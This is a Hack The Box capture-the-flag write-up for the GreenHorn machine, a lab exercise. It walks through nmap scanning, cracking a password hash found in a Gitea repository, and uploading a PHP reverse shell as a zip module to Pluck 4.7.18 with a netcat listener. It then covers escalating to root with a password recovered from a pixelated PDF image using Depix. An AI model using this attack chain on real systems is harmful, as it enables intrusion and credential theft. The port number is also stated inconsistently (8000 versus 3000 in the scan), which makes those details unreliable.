---
title: "GreenHorn from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# GreenHorn from HTB
[page](https://app.hackthebox.com/machines/GreenHorn)
First lets go and scan the IP with nmap and we get this:
```bash
 nmap -sCV 10.10.11.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-29 13:57 +04
Stats: 0:03:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.05% done; ETC: 14:00 (0:00:00 remaining)
Stats: 0:03:34 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.05% done; ETC: 14:00 (0:00:00 remaining)
Nmap scan report for greenhorn.htb (10.10.11.25)
Host is up (0.35s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=5492b10992bb7ab5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=GKYXdMU_Kco8L-vEsppzHOqkOFw6MTcyMjI0NzEzMDQ5ODczODk5NA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 29 Jul 2024 09:58:50 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=f322deec042b8556; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=jTRtL2YEqVDsduob6tpm9L9AvCQ6MTcyMjI0NzEzNzU1MDQ4NzMyMg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 29 Jul 2024 09:58:57 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=7/29%Time=66A767DA%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,252E,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=5492b10992bb7ab5;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=GKYXdMU_Kco8L-vEsppzHOqkOFw6MTcyMjI0NzEzMDQ5ODczODk5NA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20Jul\x202024\x2009:58:50\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Cont
SF:rol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nS
SF:et-Cookie:\x20i_like_gitea=f322deec042b8556;\x20Path=/;\x20HttpOnly;\x2
SF:0SameSite=Lax\r\nSet-Cookie:\x20_csrf=jTRtL2YEqVDsduob6tpm9L9AvCQ6MTcyM
SF:jI0NzEzNzU1MDQ4NzMyMg;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sam
SF:eSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Mon,\x2029\x20J
SF:ul\x202024\x2009:58:57\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPR
SF:equest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 253.20 seconds

```
As you see there is `80 and 8000`port open so it's a site. That means we have to add the IP and the site name to `/etc/hosts`file.
```bash
127.0.0.1	localhost
127.0.1.1	darkfears31.giorgi	darkfears31

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.11.25 greenhorn.htb
```
After that go to browser and access the site : `greenhorn.htb`.  that means we are on `80`port and there is link on the bottom of the page which leads us to `?login.php` and we need the password to access it.
***
maybe use hydra on it, i don't know i didn't try it, ATP i can't access to the site i don't know why.
***
To find the password go to `greenhorn.htb:8000`where we will find the password.
go to explore and there is repository. In there go to this directory and this file:
`data-->settings-->pass.php`
```php
<?php
$ww = 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163';
?>

```
This is the password for the Junior. Go to [crackstation](https://crackstation.net/) and enter the hash. you will get the password: `iloveyou1`. you can close the site you will not need it after this.
Go to the main site and log in with this password. The site is on `pluck 4.7.18`after searching exploits on this version i learnt that i needed to upload `php-reverse-shell.php`in .zip file after going to `install modules`page.
```bash
nc -nlvp 1234
```
to get the connection after uploading the `.zip`file.
After uploading we get the connection and we need to run this code because
```bash
 nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.25] 55670
Linux greenhorn 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:06:06 up 5 min,  0 users,  load average: 0.00, 0.06, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```
of this. The code is:
```python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@greenhorn:/$
```
Then we need to login as `user named junior`. So run the:
```bash
www-data@greenhorn:/home/junior$ su junior
su junior
Password: iloveyou1
```
After this in Juniors directory we can read the user.txt:
```bash
junior@greenhorn:~$ cat user.txt
cat user.txt
3663c5ef34958f2ac0a5787db46c8576
```
This is the first flag.
Also there is the `Using OpenVAS.pdf`. There is valuable information there so we need to get this file into our PC, for that we will use the:
```bash
junior@greenhorn:~$ mv 'Using OpenVAS.pdf' openvas.pdf
junior@greenhorn:~$ python3 -m http.server
```
into that directory and from our PC-s terminal we will use the:
```bash
$ wget greenhorn.htb/openvas.pdf
```
![](/assets/images/Screenshot from 2024-07-29 15-47-11.png)
There is pixelated password as image so we need to extract it with this:
```bash
$ pdfimages -png openvas.pdf output.png
```
![[output.png-000.png]]
For that we will use the `Depix`from github:
```
$ git clone https://github.com/spipm/Depix.git
```
there is code written in Git that we will use to get the password for root:
```python
python3 depix.py
-p ~/output.png-000.png  \
-s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png \
-o output.png
```
this will give us the normal `.png`file with password:
![[output.png]]
The password is:
`sidefromsidetheothersidesidefromsidetheotherside`
Then go to `NetCat`and then login as root with this:
```bash
junior@greenhorn:~$ su root
su root
Password: sidefromsidetheothersidesidefromsidetheotherside
```
after that go to `Root-s`home directory and `cat`the `root.txt` to get the root flag:
```bash
root@greenhorn:~# ls
ls
cleanup.sh  restart.sh  root.txt
root@greenhorn:~# cat root.txt
cat root.txt
ab4ea6c7e33b1184fc85dc81689155aa
```
![](/assets/images/Screenshot from 2024-07-29 15-09-27.png)
